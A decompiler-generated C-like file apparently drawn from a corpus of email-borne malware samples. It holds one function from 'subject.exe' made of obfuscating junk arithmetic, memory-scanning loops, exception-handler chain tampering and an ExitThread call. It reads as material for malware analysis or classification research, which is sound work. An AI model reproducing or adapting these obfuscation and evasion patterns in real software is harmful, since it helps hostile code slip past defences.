// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1343/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn0040112B(word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 edi, selector fs)
{
	byte al_15 = (byte) ebx;
	byte v12_20 = Mem0[ebx + 0x00000000:byte] + al_15;
	Mem21[ebx + 0x00000000:byte] = v12_20;
	byte v14_22 = Mem21[ebx + 0x00000000:byte] + al_15;
	Mem23[ebx + 0x00000000:byte] = v14_22;
	byte v15_24 = Mem23[ebx + 0x00000000:byte] + al_15;
	Mem25[ebx + 0x00000000:byte] = v15_24;
	byte v16_26 = Mem25[ebx + 0x00000000:byte] + al_15;
	Mem27[ebx + 0x00000000:byte] = v16_26;
	byte v17_28 = Mem27[ebx + 0x00000000:byte] + al_15;
	Mem29[ebx + 0x00000000:byte] = v17_28;
	byte v18_30 = Mem29[ebx + 0x00000000:byte] + al_15;
	Mem31[ebx + 0x00000000:byte] = v18_30;
	byte v19_32 = Mem31[ebx + 0x00000000:byte] + al_15;
	Mem33[ebx + 0x00000000:byte] = v19_32;
	byte v20_34 = Mem33[ebx + 0x00000000:byte] + al_15;
	Mem35[ebx + 0x00000000:byte] = v20_34;
	byte v21_36 = Mem35[ebx + 0x00000000:byte] + al_15;
	Mem37[ebx + 0x00000000:byte] = v21_36;
	byte v22_38 = Mem37[ebx + 0x00000000:byte] + al_15;
	Mem39[ebx + 0x00000000:byte] = v22_38;
	byte v23_40 = Mem39[ebx + 0x00000000:byte] + al_15;
	Mem41[ebx + 0x00000000:byte] = v23_40;
	byte v24_42 = Mem41[ebx + 0x00000000:byte] + al_15;
	Mem43[ebx + 0x00000000:byte] = v24_42;
	byte v25_44 = Mem43[ebx + 0x00000000:byte] + al_15;
	Mem45[ebx + 0x00000000:byte] = v25_44;
	byte v26_46 = Mem45[ebx + 0x00000000:byte] + al_15;
	Mem47[ebx + 0x00000000:byte] = v26_46;
	byte v27_48 = Mem47[ebx + 0x00000000:byte] + al_15;
	Mem49[ebx + 0x00000000:byte] = v27_48;
	byte v28_50 = Mem49[ebx + 0x00000000:byte] + al_15;
	Mem51[ebx + 0x00000000:byte] = v28_50;
	byte v29_52 = Mem51[ebx + 0x00000000:byte] + al_15;
	Mem53[ebx + 0x00000000:byte] = v29_52;
	word32 edi_10 = ~edi;
	word32 edi_55 = DPB(edi_10, (word16) edi_10 + 0xFF84, 0, 16);
	Mem53[0x00401093:word32]();
	word32 edi_96 = edi_55 + (ebp - 0xFFFFFFF9);
	word32 eax_89 = __rol(ebx, 0x05);
	word32 esp_112 = fp;
	word16 di_110 = (word16) edi_96;
	word32 ecx_99 = DPB(0x00009090, Mem53[ebp - 0xFFFFFFF9:word16] ^ 0x9090, 0, 16);
	byte dh_102 = SLICE((edx & 0x6AD47C2E) + 0x00000001 - 0x00000001, byte, 8);
	if (ecx_99 != 0x00000000)
	{
		ExitThread(edi_96);
		Mem283[ebx - 0x00000035:byte] = Mem53[ebx - 0x00000035:byte] + (byte) (eax_89 + edi_96 | 0x0014008D);
		word32 ecx_278 = DPB(ecx_99, 0x00, 8, 8);
		Mem288[ecx_278 + 0x00000000:byte] = Mem283[ecx_278 + 0x00000000:byte] + dh_102;
		word32 eax_290 = DPB(ecx_99, Mem288[0x00DDB800:byte], 0, 8);
		Mem292[eax_290 + 0x66017000 + eax_290:byte] = Mem288[eax_290 + 0x66017000 + eax_290:byte] + SLICE(ecx_99, byte, 8);
		di_110 = (word16) (edi_96 - 0x00000001);
		esp_112 = fp - 0x00000004;
	}
	__rol(di_110, 0x0D);
	word32 ecx_125 = Mem53[DPB(0x00127ED2, (word16) esp_112, 0, 16):word32];
	word32 edx_134 = esp_112 - 0xCCA1C575;
	word32 esi_137 = Mem53[0x00401125:word32];
	do
	{
		edx_134 = edx_134 + 0x00000001;
		ecx_125 = ecx_125 + 0x00000001;
		word16 dx_151 = (word16) edx_134;
		word32 eax_152 = Mem53[ecx_125 + 0x00000000:word32] - esi_137;
	} while (eax_152 != 0x00000000);
	__rol(dx_151, 0x0C);
	word32 eax_167 = DPB(eax_152, Mem53[ecx_125 + 0xFFFFFFFD:word16], 0, 16);
	__rol(ecx_125, 0x05);
	word32 esp_176 = esp_112 - 0x00000004;
	Mem177[esp_176 + 0x00000000:word32] = esp_176;
	word32 edi_186 = Mem177[Mem177[esp_176 + 0x00000000:word32]:word32];
	word32 ecx_191 = Mem177[0x00401069:word32];
	__rol(0x1069, 0x0C);
	word32 eax_201 = Mem177[edi_186 + 0x00000000:word32];
	__rol((word16) eax_201, 0x0C);
	edi_186 = edi_186 + 0x00000001;
	while ((eax_201 ^ ecx_191) != 0x00000000)
	{
		eax_201 = Mem177[edi_186 + 0x00000000:word32];
		__rol((word16) eax_201, 0x0C);
		edi_186 = edi_186 + 0x00000001;
	}
	Mem230[esp_176 + 0x00000000:word32] = 0x003F134E;
	word32 esi_235 = eax_167 << 0x00000010 >>u 0x00000010;
	Mem240[esp_176 + 0x00000000:word32] = Mem230[esp_176 + 0x00000000:word32] + esi_235;
	__rol((word16) esi_235, 0x09);
	Mem248[esp_176 - 0x00000004:word32] = Mem240[fs:0x00000000:word32];
	Mem253[fs:0x00000000:word32] = esp_176 - 0x00000004;
	Mem256[esp_176 - 0x00000008:word32] = 0x00000000;
	__rol((word16) ((-ecx_191 | 0xC238A15D) - 0x1BF39F15), 0x0C);
	Mem264[esp_176 - 0x0000000C:word32] = edi_186;
	return;
}

